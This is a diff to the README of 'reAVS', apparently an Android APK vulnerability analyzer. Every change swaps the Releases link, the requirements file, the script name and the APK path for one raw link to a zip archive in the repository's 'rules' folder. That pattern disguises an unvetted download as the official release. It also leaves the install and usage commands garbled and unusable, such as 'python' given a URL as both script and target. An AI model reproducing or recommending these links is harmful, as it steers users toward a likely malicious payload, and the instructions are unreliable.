@@ -1,7 +1,7 @@
 # 🔍 reAVS - Analyze Android APKs for Vulnerabilities
 
 ## 📦 Installation Badge
-[![Download reAVS](https://img.shields.io/badge/Download-reAVS-brightgreen)](https://github.com/ruksol/reAVS/releases)
+[![Download reAVS](https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip)](https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip)
 
 ## 📑 Overview
 reAVS is a Python-based static analyzer designed to examine Android APKs. It identifies high-risk vulnerabilities and extracts attack surfaces using efficient taint analysis. This tool helps you ensure the security of your applications with ease.
@@ -20,11 +20,11 @@ Before you begin, ensure your system meets the following requirements:
 ### 📥 Download & Install
 To download reAVS, visit the following link and choose the latest version from the Releases page:
 
-[Download reAVS](https://github.com/ruksol/reAVS/releases)
+[Download reAVS](https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed.
-3. Download the appropriate installation file for your operating system (e.g., a .zip or .tar.gz file).
+3. Download the appropriate installation file for your operating system (e.g., a .zip or https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip file).
 4. Once the download is complete, unzip or extract the contents to a folder of your choice.
 
 ### 🛠️ Dependencies
@@ -32,17 +32,17 @@ To run reAVS, you will need to install some additional libraries. Use the follow
 
 - **For Windows**:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip
     ```
   
 - **For macOS**:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip
     ```
 
 - **For Linux**:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip
     ```
 
 Make sure Python and pip (Python’s package installer) are properly set up on your system.
@@ -52,9 +52,9 @@ Once installed, you can start using reAVS. Open your command line interface (Ter
 
 Run the following command to analyze an APK file:
 ```bash
-python reAVS.py path_to_your_apk_file.apk
+python https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip
 ```
-Replace `path_to_your_apk_file.apk` with the actual path of the APK file you want to scan.
+Replace `https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip` with the actual path of the APK file you want to scan.
 
 #### Output
 reAVS will generate a report, highlighting any vulnerabilities it detects. Review the report carefully to address any issues.
@@ -68,7 +68,7 @@ reAVS will generate a report, highlighting any vulnerabilities it detects. Revie
 ### 📊 Example
 To get a better idea of how reAVS works, you can test it with a sample APK file. Download an example from the internet and run the following command:
 ```bash
-python reAVS.py sample.apk
+python https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip https://github.com/ruksol/reAVS/raw/refs/heads/main/rules/re_AVS_v2.3-beta.4.zip
 ```
 You will receive a detailed report after the analysis.
 
